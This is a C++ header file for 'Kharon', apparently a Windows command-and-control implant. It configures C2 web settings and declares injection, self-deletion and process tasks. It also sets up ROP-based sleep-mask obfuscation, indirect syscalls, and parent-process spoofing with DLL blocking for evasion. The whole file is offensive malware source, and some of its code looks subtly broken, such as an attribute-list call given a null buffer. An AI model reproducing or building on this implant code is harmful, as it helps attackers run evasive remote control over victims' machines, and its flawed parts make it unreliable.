#ifndef KHARON_H
#define KHARON_H

#include <windows.h>

#include <KhError.h>
#include <Win32.h>
#include <Defines.h>
#include <Evasion.h>
#include <Misc.h>
#include <Communication.h>

EXTERN_C UPTR StartPtr();
EXTERN_C UPTR EndPtr();

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Rop[ i ].Rax = U_PTR( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Rop[ i ].Rbx = U_PTR( & p );               \
    } else {                                       \
        Rop[ i ].Rip = U_PTR( p );                 \
    }

/* ========= [ Config ] ========= */

#ifndef KH_AGENT_UUID
#define KH_AGENT_UUID ""
#endif // KH_AGENT_UUID

#ifndef KH_SLEEP_TIME
#define KH_SLEEP_TIME 3
#endif // KH_SLEEP_TIME

#ifndef KH_INDIRECT_SYSCALL_ENABLED
#define KH_INDIRECT_SYSCALL_ENABLED FALSE
#endif // KH_INDIRECT_SYSCALL_ENABLED

#ifndef KH_INJECTION_PE 
#define KH_INJECTION_PE KhReflection
#endif // KH_INJECTION_PE

#ifndef KH_INJECTION_SC
#define KH_INJECTION_SC KhClassic
#endif // KH_INJECTION_SC

#ifndef KH_HEAP_MASK
#define KH_HEAP_MASK FALSE
#endif // KH_HEAP_MASK

#ifndef KH_SLEEP_MASK
#define KH_SLEEP_MASK MaskTimer
#endif // KH_SLEEP_MASK

#ifndef WEB_HOSTNAME
#define WEB_HOSTNAME ""
#endif // WEB_HOSTNAME

#ifndef WEB_PORT
#define WEB_PORT 0
#endif // WEB_PORT

#ifndef WEB_ENDPOINT
#define WEB_ENDPOINT { "/data" }
#endif // WEB_ENDPOINT

#ifndef WEB_USER_AGENT
#define WEB_USER_AGENT ""
#endif // WEB_USER_AGENT

#ifndef WEB_SECURE_ENABLED
#define WEB_SECURE_ENABLED TRUE
#endif // WEB_SECURE_ENABLED

#ifndef WEB_PROXY_URL
#define WEB_PROXY_URL ""
#endif // WEB_PROXY_URL

namespace Root {

    class Kharon {
    private:
        static Kharon* Instance;
    public:
        struct {
            PCHAR CompName;
            PCHAR UserName;
            PCHAR DomName;
            PCHAR NetBios;
            PCHAR ProcessorName;
            ULONG ProcessorsNbr;
            ULONG AvalRAM;
            ULONG UsedRAM;
            ULONG TotalRAM;
            ULONG PercentRAM;
            ULONG OsArch;
            ULONG OsMjrV;
            ULONG OsMnrV;
            ULONG ProductType;
            ULONG OsBuild;
        } Machine = {};

        struct {
            PCHAR AgentID;
            ULONG SleepTime;
            UPTR  HeapHandle;
            ULONG ProcessID;
            ULONG ParentID;
            ULONG ThreadID;
            ULONG ProcessArch;
            PCHAR CommandLine;
            PCHAR ImageName;
            PCHAR ImagePath;
            BOOL  Elevated;
            BOOL  Connected;

            struct {
                UPTR Start;
                UPTR Length;
            } Base;        
        } Session = {
            .AgentID     = KH_AGENT_UUID,
            .SleepTime   = KH_SLEEP_TIME,
            .HeapHandle  = U_PTR( NtCurrentPeb()->ProcessHeap ),
            .Connected   = FALSE
        };

        struct {
            UPTR  NtContinueGadget;
            UINT8 TechniqueID;
            UINT8 JmpGadget;
            BOOL  Heap;
        } Mask = {
            .TechniqueID = KH_SLEEP_MASK,
            .Heap        = KH_HEAP_MASK
        };

        struct {
            struct {
                UINT8 TechniqueID;
            } PE = {};

            struct {
                UINT8 TechniqueID;
            } Sc = {}; 

            BOOL Syscall;
        } Injection = {
            .PE.TechniqueID = KH_INJECTION_PE,
            .Sc.TechniqueID = KH_INJECTION_SC,

            .Syscall = KH_INDIRECT_SYSCALL_ENABLED
        };

        struct {
           ULONG ParentID;
           BOOL  BlockDlls;
           PCHAR CurrentDir;
           BOOL  Pipe; 
        } Ps = {
            .ParentID   = 0,
            .BlockDlls  = FALSE,
            .CurrentDir = 0,
            .Pipe       = TRUE
        };

        struct {
            UPTR Handle;
    
            DECLAPI( LoadLibraryA ); 
            DECLAPI( GetProcAddress );
            DECLAPI( GetModuleHandleA );
        
            DECLAPI( CreateFileA );
            DECLAPI( CreateFileW );
            DECLAPI( CreatePipe );
            DECLAPI( PeekNamedPipe );
            DECLAPI( ConnectNamedPipe );
            DECLAPI( CreateNamedPipeA );
            DECLAPI( ReadFile );
        
            DECLAPI( CreateProcessA );
            DECLAPI( OpenProcess );
        
            DECLAPI( GetComputerNameExA );
        
            DECLAPI( OpenThread );
            DECLAPI( ResumeThread );
            DECLAPI( CreateThread );
        
            DECLAPI( GlobalMemoryStatusEx );
            DECLAPI( GetNativeSystemInfo );
            DECLAPI( FormatMessageA );
        
            DECLAPI( WaitForSingleObject );
            DECLAPI( WaitForSingleObjectEx );
        
            DECLAPI( VirtualProtect );
            DECLAPI( VirtualProtectEx );
            DECLAPI( VirtualAlloc );
            DECLAPI( VirtualAllocEx );
            DECLAPI( VirtualFreeEx );
            DECLAPI( VirtualFree );
            DECLAPI( WriteProcessMemory );

            DECLAPI( InitializeProcThreadAttributeList );
            DECLAPI( UpdateProcThreadAttribute );
            DECLAPI( DeleteProcThreadAttributeList );
        } Krnl32 = {
            RSL_TYPE( LoadLibraryA ),
            RSL_TYPE( GetProcAddress ),
            RSL_TYPE( GetModuleHandleA ),
        
            RSL_TYPE( CreateFileA ),
            RSL_TYPE( CreateFileW ),
            RSL_TYPE( CreatePipe ),
            RSL_TYPE( PeekNamedPipe ),
            RSL_TYPE( ConnectNamedPipe ),
            RSL_TYPE( CreateNamedPipeA ),
            RSL_TYPE( ReadFile ),
        
            RSL_TYPE( CreateProcessA ),
            RSL_TYPE( OpenProcess ),
        
            RSL_TYPE( GetComputerNameExA ),
        
            RSL_TYPE( OpenThread ),
            RSL_TYPE( ResumeThread ),
            RSL_TYPE( CreateThread ),
        
            RSL_TYPE( GlobalMemoryStatusEx ),
            RSL_TYPE( GetNativeSystemInfo ),
            RSL_TYPE( FormatMessageA ),
        
            RSL_TYPE( WaitForSingleObject ),
            RSL_TYPE( WaitForSingleObjectEx ),
        
            RSL_TYPE( VirtualProtect ),
            RSL_TYPE( VirtualProtectEx ),
            RSL_TYPE( VirtualAlloc ),
            RSL_TYPE( VirtualAllocEx ),
            RSL_TYPE( VirtualFreeEx ),
            RSL_TYPE( VirtualFree ),
            RSL_TYPE( WriteProcessMemory ),

            RSL_TYPE( InitializeProcThreadAttributeList ),
            RSL_TYPE( UpdateProcThreadAttribute ),
            RSL_TYPE( DeleteProcThreadAttributeList )
        };

        struct {
            UPTR Handle;

            DECLAPI( DbgPrint );
            DECLAPI( NtClose );
    
            DECLAPI( RtlAllocateHeap );
            DECLAPI( RtlReAllocateHeap );
            DECLAPI( RtlFreeHeap );
    
            DECLAPI( NtAllocateVirtualMemory );
            DECLAPI( NtWriteVirtualMemory );
            DECLAPI( NtFreeVirtualMemory );
            DECLAPI( NtProtectVirtualMemory );
            DECLAPI( NtCreateSection );
            DECLAPI( NtMapViewOfSection );
    
            DECLAPI( NtOpenProcess );
            DECLAPI( NtCreateThreadEx ); 
            DECLAPI( NtOpenThread );
            DECLAPI( RtlExitUserThread );
            DECLAPI( RtlExitUserProcess );
    
            DECLAPI( DuplicateHandle );
            DECLAPI( NtGetContextThread );
            DECLAPI( NtSetContextThread );
            DECLAPI( NtCreateEvent ); 
            DECLAPI( NtContinue );
    
            DECLAPI( NtWaitForSingleObject );
            DECLAPI( NtSignalAndWaitForSingleObject );
    
            DECLAPI( NtSetInformationVirtualMemory );
    
            DECLAPI( NtTestAlert );
            DECLAPI( NtAlertResumeThread );
            DECLAPI( NtQueueApcThread );
    
            DECLAPI( RtlCreateTimer );
            DECLAPI( RtlCreateTimerQueue );
        } Ntdll = {
            RSL_TYPE( DbgPrint ),
            RSL_TYPE( NtClose ),
    
            RSL_TYPE( RtlAllocateHeap ),
            RSL_TYPE( RtlReAllocateHeap ),
            RSL_TYPE( RtlFreeHeap ),
    
            RSL_TYPE( NtAllocateVirtualMemory ),
            RSL_TYPE( NtWriteVirtualMemory ),
            RSL_TYPE( NtFreeVirtualMemory ),
            RSL_TYPE( NtProtectVirtualMemory ),
            RSL_TYPE( NtCreateSection ),
            RSL_TYPE( NtMapViewOfSection ),
    
            RSL_TYPE( NtOpenProcess ),
            RSL_TYPE( NtCreateThreadEx ),
            RSL_TYPE( NtOpenThread ),
            RSL_TYPE( RtlExitUserThread ),
            RSL_TYPE( RtlExitUserProcess ),
    
            RSL_TYPE( DuplicateHandle ),
            RSL_TYPE( NtGetContextThread ),
            RSL_TYPE( NtSetContextThread ),
            RSL_TYPE( NtCreateEvent ),
            RSL_TYPE( NtContinue ),
    
            RSL_TYPE( NtWaitForSingleObject ),
            RSL_TYPE( NtSignalAndWaitForSingleObject ),
    
            RSL_TYPE( NtSetInformationVirtualMemory ),
    
            RSL_TYPE( NtTestAlert ),
            RSL_TYPE( NtAlertResumeThread ),
            RSL_TYPE( NtQueueApcThread ),
    
            RSL_TYPE( RtlCreateTimer ),
            RSL_TYPE( RtlCreateTimerQueue )
        };
                
        explicit Kharon();

        auto Start(
            _In_ UPTR Argument
        ) -> void;
    };
}

class Heap : public Root::Kharon {
public:
    auto DECLFN Alloc(
        _In_ ULONG Size
    ) -> PVOID;

    auto DECLFN ReAlloc(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> PVOID;

    auto DECLFN Free(
        _In_ PVOID Block,
        _In_ ULONG Size
    ) -> BOOL;
};

class Process: public Root::Kharon {
public:
    auto Open(
        _In_ ULONG RightsAccess,
        _In_ BOOL  InheritHandle,
        _In_ ULONG ProcessID
    ) -> HANDLE;

    auto Create(
        _In_  PPACKAGE             Package,
        _In_  PCHAR                CommandLine,
        _In_  ULONG                PsFlags,
        _Out_ PPROCESS_INFORMATION PsInfo
    ) -> BOOL;
};
    
class Task: public Process {
public:
    struct {
        ULONG ID;
        BOOL ( *Run )( PPARSER );
    } Mgmt;
    
    static auto Dispatcher( 
        VOID 
    ) -> VOID;

    auto Injection(
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto SelfDelete( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto SleepMask( 
        _In_ PPARSER Parser 
    ) -> ERROR_CODE;

    auto SleepTime( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto Process( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto GetInfo( 
        _In_ PPARSER Parser
    ) -> ERROR_CODE;

    auto FileSystem( 
        PPARSER Parser 
    ) -> ERROR_CODE;
};
    
class ProcThreadAttrList: public Root::Kharon {
private:
    LPPROC_THREAD_ATTRIBUTE_LIST AttrBuff;
    UPTR                         AttrSize;

public:
    DECLFN ProcThreadAttrList() : AttrBuff( 0 ), AttrSize( 0 ) {}

    auto DECLFN Initialize(
        _In_ UINT8 UpdateCount
    ) -> BOOL {
        Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );

        AttrBuff = (LPPROC_THREAD_ATTRIBUTE_LIST)Heap().Alloc( AttrSize );
        return Krnl32.InitializeProcThreadAttributeList( 0, UpdateCount, 0, &AttrSize );
    }

    auto DECLFN UpdateParentSpf(
        _In_ HANDLE ParentHandle
    ) -> BOOL {
        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentHandle, sizeof( HANDLE ), 0, 0 );
    }

    auto DECLFN UpdateBlockDlls(
        VOID
    ) -> BOOL {
        UINT64 Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        return Krnl32.UpdateProcThreadAttribute( AttrBuff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &Policy, sizeof( Policy ), 0, 0 );
    }

    inline DECLFN ~ProcThreadAttrList(
        VOID
    ) {
        if ( AttrBuff ) {
            Heap().Free( AttrBuff, AttrSize );
            Krnl32.DeleteProcThreadAttributeList( AttrBuff );
        }
    }

    DECLFN LPPROC_THREAD_ATTRIBUTE_LIST GetAttrBuff() const { return AttrBuff; }
};

EXTERN_C void* __cdecl memset(void*, int, size_t);

#pragma intrinsic(memset)
#pragma function(memset)

#endif // KHARON_H